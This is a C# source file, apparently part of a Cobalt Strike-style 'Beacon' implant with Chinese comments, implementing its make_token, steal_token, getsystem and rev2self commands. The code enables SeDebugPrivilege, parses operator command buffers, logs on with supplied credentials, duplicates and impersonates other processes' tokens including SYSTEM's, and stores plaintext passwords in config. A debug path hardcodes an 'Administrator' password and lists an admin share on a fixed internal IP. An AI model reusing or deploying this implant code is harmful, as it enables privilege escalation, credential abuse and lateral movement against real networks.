using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using Beacon.Profiles;
using Beacon.Utils;

using PInvoke = Beacon.Utils;

namespace Beacon.Core
{
    /// <summary>
    /// 权限相关 make_token、steal_token、rev2self
    /// </summary>
    class Tokens : IDisposable
    {

        private List<IntPtr> OpenHandles = new List<IntPtr>();

        /// <summary>
        /// 创建Tokens类，并获取SeDebugPrivilege权限。
        /// </summary>
        public Tokens(bool EnableSeDebugPrivilege = true)
        {
            this.EnableCurrentProcessTokenPrivilege("SeDebugPrivilege");
        }

        ~Tokens()
        {
            Dispose();
        }

        /// <summary>
        /// 关闭相应的句柄
        /// </summary>
        public void Dispose()
        {
            foreach (IntPtr handle in this.OpenHandles)
            {
                this.CloseHandle(handle, false);
            }
            this.OpenHandles.Clear();
        }

        private bool CloseHandle(IntPtr handle, bool Remove = true)
        {
            if (Remove) { this.OpenHandles.Remove(handle); }
            return PInvoke.Win32.Kernel32.CloseHandle(handle);
        }


        public bool EnableCurrentProcessTokenPrivilege(string Privilege)
        {
            IntPtr currentProcessToken = this.GetCurrentProcessToken();
            if (currentProcessToken == IntPtr.Zero)
            {
                return false;
            }
            return EnableTokenPrivilege(ref currentProcessToken, Privilege);
        }

        private static List<String> Privileges = new List<string> { "SeAssignPrimaryTokenPrivilege",
            "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
            "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege",
            "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege",
            "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege",
            "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege",
            "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege",
            "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege",
            "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege",
            "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege",
            "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };

        public static byte[] EnableCurrentProcessTokenPrivilege(Tokens t, byte[] Buff)
        {

            byte[] pPrivilegeCount = new byte[2];
            Array.Copy(Buff, 0, pPrivilegeCount, 0, 2);                                                     //权限数
            Array.Reverse(pPrivilegeCount);
            uint nPrivilegeCount = BitConverter.ToUInt16(pPrivilegeCount, 0);
            if (nPrivilegeCount <= 0)
            {
                return null;
            }

            int n = 1;
            byte[] pPrivilegeLen = new byte[4];
            byte[] pPrivilege = null;
            uint nCurLen = 0;
            bool b = false;
            while (n <= nPrivilegeCount) 
            {
                Array.Copy(Buff, 2 + nCurLen, pPrivilegeLen, 0, 4);                                                   //权限长度
                Array.Reverse(pPrivilegeLen);
                uint nPrivilegeLen = BitConverter.ToUInt32(pPrivilegeLen, 0);
                nCurLen += 4;

                pPrivilege = new byte[nPrivilegeLen];
                Array.Copy(Buff, 2 + nCurLen, pPrivilege, 0, nPrivilegeLen);                                  //权限内容
                nCurLen += nPrivilegeLen;

                n++;
                b = t.EnableCurrentProcessTokenPrivilege(Bytes.ToString(pPrivilege));
            }

            return Bytes.FromString("ok");
        }

        public static byte[] MakeToken(Tokens t,byte[] ShellCommandBuf)
        {
            byte[] pDomain = null;
            byte[] pUsername = null;
            byte[] pPassword = null;

            byte[] pDomainLen = new byte[4];
            Array.Copy(ShellCommandBuf, 0, pDomainLen, 0, 4);                                       //域长度
            Array.Reverse(pDomainLen);
            uint nDomainLen = BitConverter.ToUInt32(pDomainLen, 0);
            if (nDomainLen <= 0)
            {
                return null;
            }
             

            pDomain = new byte[nDomainLen];
            Array.Copy(ShellCommandBuf, 4, pDomain, 0, nDomainLen);                                 //域内容
            string strDomain = "";
            if (nDomainLen != 1)
            {
                strDomain = Bytes.ToString(pDomain);
            }
            

            byte[] pUsernameLen = new byte[4];
            Array.Copy(ShellCommandBuf, 4 + nDomainLen, pUsernameLen, 0, 4);                         //用户名长度
            Array.Reverse(pUsernameLen);
            uint nUsernameLen = BitConverter.ToUInt32(pUsernameLen, 0);
            if (nUsernameLen <= 0)
            {
                return null;
            }

            pUsername = new byte[nUsernameLen];
            Array.Copy(ShellCommandBuf, 4 + nDomainLen + 4, pUsername, 0, nUsernameLen);                                         //用户名内容
            string strUsername = Bytes.ToString(pUsername);


            byte[] pPasswordLen = new byte[4];
            Array.Copy(ShellCommandBuf, 4 + nDomainLen + 4 + nUsernameLen, pPasswordLen, 0, 4);                                   //密码长度
            Array.Reverse(pPasswordLen);
            uint nPasswordLen = BitConverter.ToUInt32(pPasswordLen, 0);
            if (nPasswordLen <= 0)
            {
                return null;
            }

            pPassword = new byte[nPasswordLen];
            Array.Copy(ShellCommandBuf, 4 + nDomainLen + 4 + nUsernameLen + 4, pPassword, 0, nPasswordLen);                        //密码内容


            IntPtr hProcessToken1 = t.MakeToken(strUsername, strDomain, Bytes.ToString(pPassword));
            //IntPtr hProcessToken1 = t.MakeToken("Administrator", "ATTACK", "!@#Q1234");

            //make_token成功后把User、pass、domain保存起来，后续执行run/shell时会依次调用createprocesslongon\token
            if (hProcessToken1 != IntPtr.Zero)
            {
                Config._sLogonUser = strUsername;
                Config._sLogonPass = Bytes.ToString(pPassword);
                Config._sLogonDomain = strDomain;
                //Config._sLogonUser = "Administrator";
                //Config._sLogonPass = "!@#Q1234";
                //Config._sLogonDomain = "ATTACK";
                string tmp = Proc.CreateProcessWithLogon("Administrator", "ATTACK", "!@#Q1234", @"cmd.exe /C dir \\10.10.10.165\C$", "C:\\WINDOWS\\System32\\");
                return Bytes.FromString(tmp);
                //return Bytes.FromString("ok");
            }

            return Bytes.FromString("failed");
        }

        public static byte[] StealToken(Tokens t, byte[] Buff)
        {
            byte[] pPid = new byte[4];
            Array.Copy(Buff, 0, pPid, 0, 4);                               
            Array.Reverse(pPid);
            uint nPid = BitConverter.ToUInt32(pPid, 0);

            Config._TokenPtr = IntPtr.Zero;
            Config._TokenPtr = t.ImpersonateProcess(nPid);      //steal_token成功后把toekn保存起来，后续执行run/shell时会依次调用createprocesswithtoken
            if (Config._TokenPtr != IntPtr.Zero)
            {
                //函数内能正常执行
                string tmp = Proc.CreateProcessWithToken(@"cmd.exe /C whoami", "C:\\WINDOWS\\System32\\", Config._TokenPtr);
                return Bytes.FromString(tmp);
                //return Bytes.FromString("ok");
            }
            
            return Bytes.FromString("failed");
        }

        public static byte[] Rev2Self(Tokens t)
        {
            if (t.RevertToSelf())
            {
                Config._sLogonUser = "";
                Config._sLogonPass = "";
                Config._sLogonDomain = "";
                Config._TokenPtr = IntPtr.Zero;
                return Bytes.FromString("ok");
            }
                return Bytes.FromString("failed");
        }



        /// <summary>
        ///为指定令牌启用指定的安全权限。
        ///</summary>
        ///<param name="hToken">需要启用安全特权的令牌。</param>
        ///<param name=“Privilege">要启用的权限。</param>
        ///<returns>如果启用令牌成功，则为True，否则为false。</returns>
        public static bool EnableTokenPrivilege(ref IntPtr hToken, string Privilege)
        {
            if (!Privileges.Contains(Privilege))
            {
                return false;
            }
            Win32.WinNT._LUID luid = new Win32.WinNT._LUID();
            if (!PInvoke.Win32.Advapi32.LookupPrivilegeValue(null, Privilege, ref luid))
            {
                Console.Error.WriteLine("LookupPrivilegeValue() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            Win32.WinNT._LUID_AND_ATTRIBUTES luidAndAttributes = new Win32.WinNT._LUID_AND_ATTRIBUTES
            {
                Luid = luid,
                Attributes = Win32.WinNT.SE_PRIVILEGE_ENABLED
            };

            Win32.WinNT._TOKEN_PRIVILEGES newState = new Win32.WinNT._TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Privileges = luidAndAttributes
            };

            Win32.WinNT._TOKEN_PRIVILEGES previousState = new Win32.WinNT._TOKEN_PRIVILEGES();
            if (!PInvoke.Win32.Advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out _))
            {
                Console.Error.WriteLine("AdjustTokenPrivileges() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            return true;
        }



        ///<summary>
        ///模拟使用指定进程的令牌(需要管理员）
        ///</summary>
        ///<param name="ProcessID">要模拟的进程的进程ID。</param>
        ///<returns>如果模拟成功，则为True，否则为false。</returns>
        public IntPtr ImpersonateProcess(UInt32 ProcessID)
        {
            IntPtr hProcessToken = GetTokenForProcess(ProcessID);
            if (hProcessToken == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            Win32.WinBase._SECURITY_ATTRIBUTES securityAttributes = new Win32.WinBase._SECURITY_ATTRIBUTES();
            if (!PInvoke.Win32.Advapi32.DuplicateTokenEx(
                    hProcessToken,
                    (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                    ref securityAttributes,
                    Win32.WinNT._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    Win32.WinNT.TOKEN_TYPE.TokenImpersonation,
                    out IntPtr hDuplicateToken
                )
            )
            {
                Console.Error.WriteLine("DuplicateTokenEx() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                this.CloseHandle(hProcessToken);
                return IntPtr.Zero;
            }
            this.OpenHandles.Add(hDuplicateToken);

            if (!PInvoke.Win32.Advapi32.ImpersonateLoggedOnUser(hDuplicateToken))
            {
                Console.Error.WriteLine("ImpersonateLoggedOnUser() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                this.CloseHandle(hProcessToken);
                this.CloseHandle(hDuplicateToken);
                return IntPtr.Zero;
            }
            this.CloseHandle(hProcessToken);
            return hDuplicateToken;
        }



        ///<summary>
        ///使用指定的用户名和密码创建一个新令牌
        ///</summary>
        ///<param name="Username">要作为身份验证的用户名。</param>
        ///<param name="Domain">验证用户身份的域。</param>
        ///<param name="Password">验证用户身份的密码。</param>
        ///<returns>如果模拟成功，则为True，否则为false。</returns> 
        public IntPtr MakeToken(string Username, string Domain, string Password, Win32.Advapi32.LOGON_TYPE LogonType = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS)
        {
            IntPtr hProcessToken = IntPtr.Zero;
            if (!PInvoke.Win32.Advapi32.LogonUserA(
                Username, Domain, Password,
                LogonType, Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT,
                out hProcessToken)
                )
            {
                Console.Error.WriteLine("LogonUserA() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return IntPtr.Zero;
            }
            this.OpenHandles.Add(hProcessToken);

            if (!PInvoke.Win32.Advapi32.ImpersonateLoggedOnUser(hProcessToken))
            {
                Console.Error.WriteLine("ImpersonateLoggedOnUser() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                this.CloseHandle(hProcessToken);
                return IntPtr.Zero;
            }
            return hProcessToken;
        }

        ///<summary>
        ///查找特定用户拥有的进程并模拟令牌。用于执行后续命令(需要管理员）
        ///</summary>
        ///<param name="Username">要模拟的用户。“需要“域\用户名”格式。</param>
        ///<returns>如果模拟成功，则为True，否则为false。</returns>
        public bool ImpersonateUser(string Username)
        {
            List<UserProcessToken> userProcessTokens = this.GetUserProcessTokensForUser(Username);
            foreach (UserProcessToken userProcessToken in userProcessTokens)
            {
                if (this.ImpersonateProcess((UInt32)userProcessToken.Process.Id) != IntPtr.Zero)
                {
                    return true;
                }
            }
            return false;
        }

        ///<summary>
        ///模拟系统用户。等同于'ImpersonateUser（'NT AUTHORITY\SYSTEM'）`(需要管理员）
        ///</summary>
        ///<returns>如果模拟成功，则为True，否则为false。</returns>
        public bool GetSystem()
        {
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));
            return this.ImpersonateUser(systemAccount.ToString());
        }

        ///<summary>
        ///结束对任何令牌的模拟，还原回与当前进程关联的初始令牌。
        ///与模拟令牌且不会自动还原为自身的函数结合使用时非常有用，例如
        ///例如：`ImpersonateUser（）`、`ImpersonateProcess（）`、`GetSystem（）`和`MakeToken（）`。
        ///</summary>
        ///<returns>如果retertoself成功，则为True，否则为false。</returns>
        public bool RevertToSelf()
        {
            if (!PInvoke.Win32.Advapi32.RevertToSelf())
            {
                Console.Error.WriteLine("RevertToSelf() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }
            return true;
        }

        private List<UserProcessToken> GetUserProcessTokensForUser(string Username, bool Elevated = false)
        {
            return this.GetUserProcessTokens(Elevated).Where(UP => UP.Username.ToLower() == Username.ToLower()).ToList();
        }

        private List<UserProcessToken> GetUserProcessTokens(bool Elevated = false)
        {
            return Process.GetProcesses().Select(P =>
            {
                try
                {
                    return new UserProcessToken(P);
                }
                catch (CreateUserProcessTokenException e)
                {
                    Console.Error.WriteLine("CreateUserProcessTokenException: " + e.Message);
                    return null;
                }
            }).Where(P => P != null).Where(P => (!Elevated || P.IsElevated)).ToList();
        }

        private IntPtr GetTokenForProcess(UInt32 ProcessID)
        {
            IntPtr hProcess = PInvoke.Win32.Kernel32.OpenProcess(Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION, true, ProcessID);
            if (hProcess == IntPtr.Zero)
            {
                Console.Error.WriteLine("OpenProcess() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return IntPtr.Zero;
            }
            this.OpenHandles.Add(hProcess);

            IntPtr hProcessToken = IntPtr.Zero;
            if (!PInvoke.Win32.Kernel32.OpenProcessToken(hProcess, Win32.Advapi32.TOKEN_ALT, out hProcessToken))
            {
                Console.Error.WriteLine("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return IntPtr.Zero;
            }
            this.OpenHandles.Add(hProcessToken);
            this.CloseHandle(hProcess);

            return hProcessToken;
        }

        private IntPtr GetCurrentProcessToken()
        {
            if (!PInvoke.Win32.Kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.Advapi32.TOKEN_ALL_ACCESS, out IntPtr currentProcessToken))
            {
                Console.Error.WriteLine("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return IntPtr.Zero;
            }

            OpenHandles.Add(currentProcessToken);
            return currentProcessToken;
        }

        private static bool TokenIsElevated(IntPtr hToken)
        {
            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(UInt32));
            IntPtr tokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UInt32)));
            UInt32 returnLength;

            bool result = PInvoke.Win32.Advapi32.GetTokenInformation(
                hToken,
                Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenElevationType,
                tokenInformation,
                tokenInformationLength,
                out returnLength
            );

            switch ((Win32.WinNT._TOKEN_ELEVATION_TYPE)Marshal.ReadInt32(tokenInformation))
            {
                case Win32.WinNT._TOKEN_ELEVATION_TYPE.TokenElevationTypeDefault:
                    return false;
                case Win32.WinNT._TOKEN_ELEVATION_TYPE.TokenElevationTypeFull:
                    return true;
                case Win32.WinNT._TOKEN_ELEVATION_TYPE.TokenElevationTypeLimited:
                    return false;
                default:
                    return true;
            }
        }

        internal class CreateUserProcessTokenException : Exception
        {
            public CreateUserProcessTokenException(string message) : base(message) { }
        }

        public class UserProcessToken
        {
            public string Username { get; }
            public Process Process { get; }
            public Win32.WinNT.TOKEN_TYPE TokenType { get; }
            public bool IsElevated { get; }

            public UserProcessToken(Process process)
            {
                this.Process = process;
                IntPtr hProcess = PInvoke.Win32.Kernel32.OpenProcess(Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, true, (UInt32)this.Process.Id);
                if (hProcess == IntPtr.Zero)
                {
                    throw new CreateUserProcessTokenException("OpenProcess() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                }

                IntPtr hProcessToken;
                if (!PInvoke.Win32.Kernel32.OpenProcessToken(hProcess, (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, out hProcessToken))
                {
                    throw new CreateUserProcessTokenException("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                }
                PInvoke.Win32.Kernel32.CloseHandle(hProcess);

                UInt32 dwLength = 0;
                Win32.WinNT._TOKEN_STATISTICS tokenStatistics = new Win32.WinNT._TOKEN_STATISTICS();
                this.TokenType = tokenStatistics.TokenType;
                if (!PInvoke.Win32.Advapi32.GetTokenInformation(hProcessToken, Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
                {
                    if (!PInvoke.Win32.Advapi32.GetTokenInformation(hProcessToken, Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
                    {
                        throw new CreateUserProcessTokenException("GetTokenInformation() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    }
                }
                this.IsElevated = TokenIsElevated(hProcessToken);
                PInvoke.Win32.Kernel32.CloseHandle(hProcessToken);

                this.Username = ConvertTokenStatisticsToUsername(tokenStatistics);
                if (this.Username == null || this.Username == "")
                {
                    throw new CreateUserProcessTokenException("No Username Error");
                }
            }

            private static string ConvertTokenStatisticsToUsername(Win32.WinNT._TOKEN_STATISTICS tokenStatistics)
            {
                IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Win32.WinNT._LUID)));
                Marshal.StructureToPtr(tokenStatistics.AuthenticationId, lpLuid, false);
                if (lpLuid == IntPtr.Zero)
                {
                    Console.Error.WriteLine("PtrToStructure() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return "";
                }

                IntPtr ppLogonSessionData = new IntPtr();
                if (PInvoke.Win32.Secur32.LsaGetLogonSessionData(lpLuid, out ppLogonSessionData) != 0)
                {
                    Console.Error.WriteLine("LsaGetLogonSessionData() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return "";
                }
                if (ppLogonSessionData == IntPtr.Zero)
                {
                    Console.Error.WriteLine("LsaGetLogonSessionData() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return "";
                }

                Win32.Secur32._SECURITY_LOGON_SESSION_DATA securityLogonSessionData = (Win32.Secur32._SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(ppLogonSessionData, typeof(Win32.Secur32._SECURITY_LOGON_SESSION_DATA));
                if (securityLogonSessionData.pSid == IntPtr.Zero || securityLogonSessionData.Username.Buffer == IntPtr.Zero || securityLogonSessionData.LoginDomain.Buffer == IntPtr.Zero)
                {
                    Console.Error.WriteLine("PtrToStructure() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    return "";
                }

                if (Marshal.PtrToStringUni(securityLogonSessionData.Username.Buffer) == Environment.MachineName + "$")
                {
                    string Username = ConvertSidToName(securityLogonSessionData.pSid);
                    if (Username == null || Username == "")
                    {
                        Console.Error.WriteLine("No Username Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                        return "";
                    }
                    return Username;
                }

                return Marshal.PtrToStringUni(securityLogonSessionData.LoginDomain.Buffer) + "\\" + Marshal.PtrToStringUni(securityLogonSessionData.Username.Buffer);
            }


            public static string ConvertSidToName(IntPtr pSid)
            {
                StringBuilder lpName = new StringBuilder();
                UInt32 cchName = (UInt32)lpName.Capacity;
                StringBuilder lpReferencedDomainName = new StringBuilder();
                UInt32 cchReferencedDomainName = (UInt32)lpReferencedDomainName.Capacity;
                Win32.WinNT._SID_NAME_USE sidNameUser;
                PInvoke.Win32.Advapi32.LookupAccountSid(String.Empty, pSid, lpName, ref cchName, lpReferencedDomainName, ref cchReferencedDomainName, out sidNameUser);

                lpName.EnsureCapacity((Int32)cchName);
                lpReferencedDomainName.EnsureCapacity((Int32)cchReferencedDomainName);
                if (PInvoke.Win32.Advapi32.LookupAccountSid(String.Empty, pSid, lpName, ref cchName, lpReferencedDomainName, ref cchReferencedDomainName, out sidNameUser))
                {
                    return "";
                }
                if (String.IsNullOrEmpty(lpName.ToString()) || String.IsNullOrEmpty(lpReferencedDomainName.ToString()))
                {
                    return "";
                }
                return lpReferencedDomainName.ToString() + "\\" + lpName.ToString();
            }
        }
    }
}
